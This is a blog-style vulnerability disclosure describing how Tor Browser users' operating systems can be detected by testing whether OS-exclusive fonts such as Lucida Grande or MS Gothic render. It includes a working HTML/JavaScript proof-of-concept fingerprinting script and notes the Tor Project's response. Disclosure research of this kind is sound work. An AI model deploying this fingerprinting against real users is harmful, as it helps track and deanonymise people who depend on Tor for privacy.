---
layout: content
title: 'Detecting Tor Browser platform based on exclusive fonts rendering'
description: 'Through the rendering of some specific Fonts, I discovered that it is possible to identify a users operating system behind Tor and after reporting this to the Tor Project I was told that they were already aware of the problem and there are already some implementations to minimize the impact of this vulnerability.'
og_image: https://heitorgouvea.me/images/publications/tor-detect-platform/tor-browser-macos.png
---

### Summary

Through the rendering of some specific Fonts, I discovered that it is possible to identify a user's operating system behind Tor and after reporting this to the Tor Project I was told that they were already aware of the problem and there are already some implementations to minimize the impact of this vulnerability.

---

### Description

The Tor browser is based on Firefox, with its peculiarities and privacy/anonymity digital promises, in addition to all its engineering to hide the IP from its user, Tor also promises to combat identifications that are linked to a person’s operating system, such for example: techniques that use JavaScript to capture the screen size and identify a unique feature of it.

However, it is possible to find out the operating system of a person using Tor via a technique that makes use of Fonts "exclusive" to some operating systems.

For example, the font “Lucida Grande” is one of them, which by default is only installed on MacOS, so when an HTML page tries to render it and is successful it can be concluded that that user is using “Tor on a MacOS”, already an example to identify users “Tor on Windows” would be the font “MS Gothic” among many other examples.

After reporting this problem, I was told that the Tor Project is already aware of all of this, and some implementations are already present in the current version of Tor to reduce the impact of this vulnerability and there are also plans for the future so that it ceases to exist for complete.

More information about this can be found at: [https://2019.www.torproject.org/projects/torbrowser/design/](https://2019.www.torproject.org/projects/torbrowser/design/)

---

### Proof of Concept

Exploit:

```html
<html>
    <head>
        <title>PoC Fingerprint</title>
        <meta charset="utf-8"/>
        <style type="text/css">
            body {
                font-family: "Lucida Grande";
            }
        </style>
    </head>
    <body>
        <h1>Hello World</h1>
    </body>
    <script>
        (function (document) {
            var width;
            var body = document.body;
            var container = document.createElement("span");

            container.innerHTML = Array(100).join("wi");
            container.style.cssText = [
                "position: absolute",
                "width: auto",
                "font-size: 128px",
                "left: -99999px"
            ].join(" !important;");

            var getWidth = function (fontFamily) {
                container.style.fontFamily = fontFamily;

                body.appendChild(container);
                width = container.clientWidth;
                body.removeChild(container);

                return width;
            };

            var monoWidth  = getWidth("monospace");
            var serifWidth = getWidth("serif");
            var sansWidth  = getWidth("sans-serif");

            window.isFontAvailable = function (font) {
                return monoWidth !== getWidth(font + ",monospace") ||
                sansWidth !== getWidth(font + ",sans-serif") ||
                serifWidth !== getWidth(font + ",serif");
            };
        })(document);

        if (isFontAvailable("Lucida Grande")) {
            alert("You are using the MacOS plataform");
        }

        else if (isFontAvailable("MS Gothic")) {
            alert("You are using the Windows plataform");
        }

        else {
            alert("You are not using the MacOs/Windows Platform");
        }
    </script>
</html>
```

User identification using Tor on MacOS:

![](/images/publications/tor-detect-platform/tor-browser-macos.png)


User identification using Tor on Windows: 

![](/images/publications/tor-detect-platform/tor-browser-windows.jpeg)

There is a margin of error in this technique, as a user can install fonts that are not the default for an operating system, but an attacker can make use of even more esoteric fonts...


---

### Impact

Through this technique it is possible to identify the operating system of a user who is using Tor, on a website with low traffic volume, this distinction is enough to exclusively track users, already for a high traffic website, allows you to track users in a unique way in a short period of time.

---

### Conclusion

This vulnerability can be combined with others to develop a profile unique enough to track users on Tor. However, it is reassuring to know that the team behind Tor Browser is extremely agile and is very close to the research community, this certainly helps a lot.

---

### References

* [https://www.torproject.org/](https://www.torproject.org/)
* [https://en.wikipedia.org/wiki/Tor_(anonymity_network)](https://en.wikipedia.org/wiki/Tor_(anonymity_network))
* [https://2019.www.torproject.org/projects/torbrowser/design/](https://2019.www.torproject.org/projects/torbrowser/design/)
* [https://gitlab.torproject.org/tpo/applications/tor-browser/-/issues/18097](https://gitlab.torproject.org/tpo/applications/tor-browser/-/issues/18097)
* [https://www.samclarke.com/javascript-is-font-available/](https://www.samclarke.com/javascript-is-font-available/)
